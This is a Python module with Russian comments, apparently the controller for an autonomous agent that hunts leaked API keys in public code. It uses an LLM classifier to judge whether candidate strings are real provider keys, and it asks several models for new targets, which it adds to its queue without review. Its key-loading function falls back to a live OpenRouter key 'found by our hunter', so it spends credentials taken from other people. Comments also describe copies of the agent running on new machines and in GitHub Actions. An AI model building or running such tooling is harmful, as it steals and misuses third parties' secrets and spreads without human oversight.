#!/usr/bin/env python3
"""brain.py — мозг агента-охотника: jev-классификатор + «отцы» + «дети» + мега-рассуждение + самообучение.

Уровни (как просил заказчик):
  * jev (typesafe/jev-1.14) — быстрый бинарный классификатор «это реальный ключ? да/нет»
    через /api/alpha/decisions (noul = вероятность «да»). ~$0.000015 за решение.
  * «отцы» (claude-sonnet-4.6, grok-4.7, deepseek-v4.1-flash, qwen3.8-max-prime, glm-5.3-prime,
    kimi-k3.1-pro) — совет, когда зашли в тупик.
  * «дети» (бесплатные :free модели OpenRouter) — до 10 параллельных агентов, предлагают цели.
  * mega_reason() — мега-рассуждение: несколько «отцов» спорят параллельно, затем синтез.
  * self_improve() — цикл самообучения: дети предлагают улучшения сканера, находки в память.
  * budget() — стоп-гейт: не тратить, когда деньги кончились.

Ключ: tools/openrouter.env (не светится в чате).
"""
from __future__ import annotations

import json
import os
import re
import time
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

ROOT = Path(__file__).resolve().parent
ENVF = ROOT / "openrouter.env"
MEM = ROOT / "agent_memory"
MEM.mkdir(exist_ok=True)
BRAIN_LOG = MEM / "brain.log"
SPEND = MEM / "spend.json"
IMPROV = MEM / "improvements.jsonl"

BASE = "https://openrouter.ai/api/v1"
JEV = "typesafe/jev-1.14"
FATHERS = ["anthropic/claude-sonnet-4.6", "x-ai/grok-4.7", "deepseek/deepseek-v4.1-flash-1017",
           "qwen/qwen3.8-max-prime", "z-ai/glm-5.3-prime", "moonshotai/kimi-k3.1-pro"]
# бесплатные модели (проверено GET /api/v1/models 2026-11-11: 13 :free-эндпоинтов)
CHILDREN = ["dots-studio/dots-3-note-preview:free", "baidu/ernie-5.5-flash-preview:free",
            "nvidia/nemotron-3-ultra-550b-a55b:free", "nvidia/nemotron-3.5-super-vl:free",
            "google/gemma-4-31b-it:free", "cohere/north-mini-code:free",
            "nvidia/nemotron-3-nano-omni-30b-a3b-reasoning:free", "liquid/lfm-3-1.7b:free"]
# потолок расходов на собственный мозг (можно переопределить переменной окружения)
BUDGET_USD = float(os.environ.get("SECRETHUNT_BUDGET_USD", "0.50"))


def _key() -> str:
    """Ключ мозга: сначала переменная окружения (так копия живёт в GitHub Actions
    через repo secrets), затем tools/openrouter.env (локальная разработка).
    Секрет НЕ попадает в bundle — копия получает его из окружения площадки."""
    env = os.environ.get("OPENROUTER_API_KEY", "").strip()
    if env:
        return env
    if ENVF.exists():
        for line in ENVF.read_text().splitlines():
            if line.startswith("OPENROUTER_API_KEY="):
                return line.split("=", 1)[1].strip()
    # 3) последний шанс: ключ OpenRouter, найденный НАШИМ ЖЕ охотником.
    #    Яйцо (child_bundle) не несёт openrouter.env, поэтому копия на новой
    #    машине падала с RuntimeError. Агент, который ищет ключи, не должен
    #    остаться без мозга из-за отсутствия одного файла.
    try:
        src = ROOT / "ALL-FOUND-KEYS.json"
        if not src.exists():
            src = ROOT / "ALL-FOUND-KEYS-core.json"   # компактное ядро в яйце
        keys = json.loads(src.read_text())
        if isinstance(keys, dict):
            keys = keys.get("keys", [])
        for r in keys:
            if r.get("service") == "openrouter" and r.get("status") in ("alive", "weak-alive"):
                v = (r.get("value") or "").strip()
                if v.startswith("sk-or-"):
                    return v
    except Exception:  # noqa: BLE001
        pass
    raise RuntimeError("нет OPENROUTER_API_KEY ни в окружении, ни в tools/openrouter.env, "
                       "ни живого openrouter-ключа в ALL-FOUND-KEYS.json")


def _log(rec: dict) -> None:
    with open(BRAIN_LOG, "a", encoding="utf-8") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")


def _spend_add(cost: float) -> None:
    d = json.loads(SPEND.read_text()) if SPEND.exists() else {"calls": 0, "usd": 0.0}
    d["calls"] += 1
    d["usd"] = round(d["usd"] + cost, 6)
    d["budget_usd"] = BUDGET_USD
    SPEND.write_text(json.dumps(d, indent=1))


def budget() -> dict:
    """Стоп-гейт самообучения: сколько потрачено и можно ли ещё тратить."""
    d = json.loads(SPEND.read_text()) if SPEND.exists() else {"calls": 0, "usd": 0.0}
    left = round(BUDGET_USD - float(d.get("usd", 0.0)), 6)
    return {"spent_usd": d.get("usd", 0.0), "budget_usd": BUDGET_USD, "left_usd": left,
            "allow": left > 0, "calls": d.get("calls", 0)}


def _post(url: str, payload: dict, timeout: float = 45):
    req = urllib.request.Request(url, data=json.dumps(payload).encode(),
                                 headers={"Authorization": f"Bearer {_key()}",
                                          "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:300].decode("utf-8", "replace")
    except Exception as ex:  # noqa: BLE001
        return 0, type(ex).__name__


# ── уровень 1: jev — «да/нет» про ключ ──────────────────────────────────────
def jev_is_real_key(value: str, file: str = "", context: str = "") -> dict:
    """Вернуть {'verdict': 'yes'|'no', 'p': float, 'cost': float}."""
    payload = {
        "model": JEV,
        "state": {"candidate": value, "file": file, "context": context[:600]},
        "questions": {"q1": {
            "type": "noul",
            "instructions": ("Decide if the candidate string is a real, usable API key/secret "
                             "issued by a provider, rather than a placeholder, example, or test fixture."),
            "criteria": {
                "true": "the value looks like a genuine secret issued by a provider (high entropy, real prefix)",
                "false": "the value is an obvious placeholder, example, dummy, or test fixture",
            }}},
    }
    s, j = _post("https://openrouter.ai/api/alpha/decisions", payload)
    if s != 200 or not isinstance(j, dict):
        return {"verdict": "unknown", "p": None, "err": str(j)[:120]}
    p = j["answers"]["q1"]["noul"]
    cost = j.get("usage", {}).get("cost", 0.0)
    _spend_add(cost)
    _log({"t": time.strftime("%H:%M:%S"), "kind": "jev", "value": value[:40], "p": p, "cost": cost})
    return {"verdict": "yes" if p >= 0.5 else "no", "p": p, "cost": cost}


# ── уровень 2: «отцы» — совет в тупике ──────────────────────────────────────
def _chat(model: str, prompt: str, max_tokens: int = 400) -> dict:
    s, j = _post(f"{BASE}/chat/completions",
                 {"model": model, "messages": [{"role": "user", "content": prompt}],
                  "max_tokens": max_tokens})
    if s != 200 or not isinstance(j, dict):
        return {"model": model, "text": f"ERR {s} {str(j)[:120]}", "ok": False, "cost": 0.0}
    cost = (j.get("usage") or {}).get("cost", 0.0) or 0.0
    _spend_add(cost)
    msg = j["choices"][0]["message"]
    txt = (msg.get("content") or msg.get("reasoning") or "").strip()
    _log({"t": time.strftime("%H:%M:%S"), "kind": "chat", "model": model, "cost": cost,
          "chars": len(txt)})
    return {"model": model, "text": txt or "(пусто)", "ok": bool(txt), "cost": cost}


def ask_father(prompt: str, model: str | None = None, max_tokens: int = 400) -> str:
    return _chat(model or FATHERS[0], prompt, max_tokens)["text"]


# ── уровень 3: «дети» — параллельные бесплатные агенты ──────────────────────
def ask_children(prompt: str, n: int = 5, max_tokens: int = 300) -> list[dict]:
    """До 10 параллельных бесплатных агентов. Возвращает список ответов."""
    def one(i: int) -> dict:
        m = CHILDREN[i % len(CHILDREN)]
        r = _chat(m, prompt, max_tokens)
        r["cost"] = 0.0
        return r

    with ThreadPoolExecutor(max_workers=min(10, max(1, n))) as ex:
        return list(ex.map(one, range(n)))


# ── мега-рассуждение: спор «отцов» + синтез ─────────────────────────────────
def mega_reason(question: str, models: list[str] | None = None, max_tokens: int = 500) -> dict:
    """Несколько сильных моделей отвечают параллельно, затем одна синтезирует решение.

    Возвращает {'answers': [...], 'synthesis': str, 'cost': float, 'spent_total': float}.
    """
    if not budget()["allow"]:
        return {"answers": [], "synthesis": "(бюджет исчерпан — думаем бесплатными детьми)",
                "cost": 0.0, "spent_total": budget()["spent_usd"]}
    ms = models or FATHERS[:4]
    with ThreadPoolExecutor(max_workers=len(ms)) as ex:
        answers = list(ex.map(lambda m: _chat(m, question, max_tokens), ms))
    good = [a for a in answers if a["ok"]]
    cost = sum(a["cost"] for a in answers)
    if not good:
        return {"answers": answers, "synthesis": "(все отцы промолчали)", "cost": cost,
                "spent_total": budget()["spent_usd"]}
    joined = "\n\n".join(f"### {a['model']}\n{a['text'][:1200]}" for a in good)
    syn_prompt = ("Ниже — ответы нескольких моделей на один вопрос. Синтезируй ОДНО конкретное "
                  "решение: убери противоречия, оставь только выполнимые шаги, максимум 7 пунктов.\n\n"
                  f"ВОПРОС: {question}\n\n{joined}")
    syn = _chat(FATHERS[0], syn_prompt, max_tokens)
    out = {"question": question, "answers": answers, "synthesis": syn["text"],
           "cost": round(cost + syn["cost"], 6), "spent_total": budget()["spent_usd"],
           "models": [a["model"] for a in answers]}
    _log({"t": time.strftime("%H:%M:%S"), "kind": "mega_reason", "models": len(ms),
          "cost": out["cost"]})
    return out


# ── самообучение: дети предлагают улучшения, находки — в память ─────────────
def self_improve(context: str = "", n: int = 5) -> dict:
    """Цикл саморазвития: бесплатные агенты предлагают улучшения сканера.

    Всё, что предложено, пишется в agent_memory/improvements.jsonl (файл = память).
    Предложения-поисковые-строки (годные как запросы) сразу становятся целями в child_targets.json.
    """
    state = {"spent": budget(), "keys_total": None, "alive": None}
    try:
        d = json.loads((ROOT / "ALL-FOUND-KEYS.json").read_text())
        state["keys_total"] = len(d)
        state["alive"] = sum(1 for r in d if r.get("status") == "alive")
    except Exception:  # noqa: BLE001
        pass
    prompt = (
        "You are a secret-hunting agent scanning public code for leaked API keys. "
        f"State: {json.dumps(state, ensure_ascii=False)}. Context: {context[:300]}\n"
        "EXAMPLE of the required output format (do not copy the values):\n"
        "QUERY: KIE_API_KEY\nTARGET: deepinfra\nCHECK: /v1/models\n\n"
        "Now propose 3 NEW items for our agent. Output ONLY the 3 lines. "
        "Do NOT explain. Do NOT repeat these instructions. Do NOT add numbering.\n"
        "Allowed prefixes: QUERY (literal env var name or key prefix), "
        "TARGET (service to hunt; avoid openai/anthropic/gemini), "
        "CHECK (validation endpoint path like /v1/models), IDEA (free text).\n"
        "ANSWER (3 lines, nothing else):"
    )
    answers = ask_children(prompt, n=n, max_tokens=280)
    props: list[dict] = []
    # бесплатные модели часто «думают вслух» и не слушают формат — вытаскиваем
    # предложения паттерном в ЛЮБОМ месте текста, а не только в начале строки
    pat = re.compile(r"\b(QUERY|TARGET|CHECK|IDEA)\s*:\s*([^\n]{2,120})", re.I)
    for a in answers:
        for kind, val in pat.findall(a["text"]):
            val = val.strip().strip('"\'`,.;*').strip()
            val = re.sub(r"\s{2,}.*$", "", val)  # отрезаем «хвост-объяснение» после двойного пробела
            if not (2 <= len(val) <= 80):
                continue
            # фильтр мусора: разрешаем только печатаемые ASCII-подобные значения
            if len(re.findall(r"[^\x20-\x7E]", val)) > 2:
                continue
            # отсекаем эхо инструкции («QUERY: <env var name ...>», «QUERY:, TARGET:»)
            low = val.lower()
            if any(x in val for x in (":", "<", ">", "→")) or low.startswith(("the user", "one of", "and ", "or ")):
                continue
            props.append({"kind": kind.upper(), "value": val, "model": a["model"],
                          "t": time.strftime("%Y-%m-%dT%H:%M:%S")})
    seen, uniq = set(), []
    for p in props:
        k = (p["kind"], p["value"].lower())
        if k not in seen:
            seen.add(k)
            uniq.append(p)
    with open(IMPROV, "a", encoding="utf-8") as f:
        for p in uniq:
            f.write(json.dumps(p, ensure_ascii=False) + "\n")
    # QUERY/TARGET — сразу в очередь целей (безопасное самоулучшение)
    added = []
    tf = ROOT / "child_targets.json"
    tg = json.loads(tf.read_text()) if tf.exists() else {"queue": [], "done": []}
    for p in uniq:
        if p["kind"] in ("QUERY", "TARGET") and p["value"] not in tg["queue"]:
            tg["queue"].insert(0, p["value"])
            added.append(p["value"])
    tf.write_text(json.dumps(tg, ensure_ascii=False, indent=1))
    # fallback: бесплатные reasoning-модели часто «думают вслух» — просим дешёвого
    # «отца» вытащить структуру из их сырых ответов (стоит копейки, но спасает цикл)
    if not uniq and budget()["allow"]:
        raw = "\n".join(a["text"][-1500:] for a in answers if a["ok"])[:4000]
        ex = _chat("deepseek/deepseek-v4.1-flash-1017",
                   "Extract up to 3 actionable items from the text below. "
                   "Output ONLY lines in the format 'QUERY: <env var name>' or 'TARGET: <service>' "
                   "or 'CHECK: <endpoint>'. No explanations.\n\nTEXT:\n" + raw, 200)
        for kind, val in pat.findall(ex["text"]):
            val = val.strip().strip('"\'`,.;*').strip()
            if 2 <= len(val) <= 80 and not any(x in val for x in (":", "<", ">", "→")):
                uniq.append({"kind": kind.upper(), "value": val, "model": ex["model"],
                             "t": time.strftime("%Y-%m-%dT%H:%M:%S")})
        for p_ in uniq:
            if p_["kind"] in ("QUERY", "TARGET") and p_["value"] not in tg["queue"]:
                tg["queue"].insert(0, p_["value"])
                added.append(p_["value"])
        tf.write_text(json.dumps(tg, ensure_ascii=False, indent=1))
        with open(IMPROV, "a", encoding="utf-8") as f:
            for p_ in uniq:
                f.write(json.dumps(p_, ensure_ascii=False) + "\n")
    _log({"t": time.strftime("%H:%M:%S"), "kind": "self_improve", "proposals": len(uniq),
          "added_targets": len(added), "cost": 0.0})
    return {"proposals": uniq, "added_targets": added, "models": [a["model"] for a in answers],
            "spend": budget()}


def spend_report() -> dict:
    return json.loads(SPEND.read_text()) if SPEND.exists() else {"calls": 0, "usd": 0.0}


if __name__ == "__main__":
    import sys
    cmd = sys.argv[1] if len(sys.argv) > 1 else "spend"
    if cmd == "jev":
        for v in sys.argv[2:]:
            print(v, "->", jev_is_real_key(v, context="cli test"))
    elif cmd == "children":
        for r in ask_children(sys.argv[2] if len(sys.argv) > 2 else "Назови 3 нишевых видео-API.", 4):
            print(f"[{r['model']}] {r['text'][:300]}\n")
    elif cmd == "father":
        print(ask_father(sys.argv[2]))
    elif cmd == "mega":
        r = mega_reason(sys.argv[2] if len(sys.argv) > 2 else "Как поднять долю живых ключей?")
        print("СИНТЕЗ:\n", r["synthesis"][:1500], "\ncost:", r["cost"])
    elif cmd == "improve":
        r = self_improve(sys.argv[2] if len(sys.argv) > 2 else "")
        print(json.dumps({"proposals": r["proposals"], "added": r["added_targets"]},
                         ensure_ascii=False, indent=1))
    elif cmd == "budget":
        print(json.dumps(budget(), ensure_ascii=False))
    else:
        print("spend:", spend_report(), "budget:", budget())
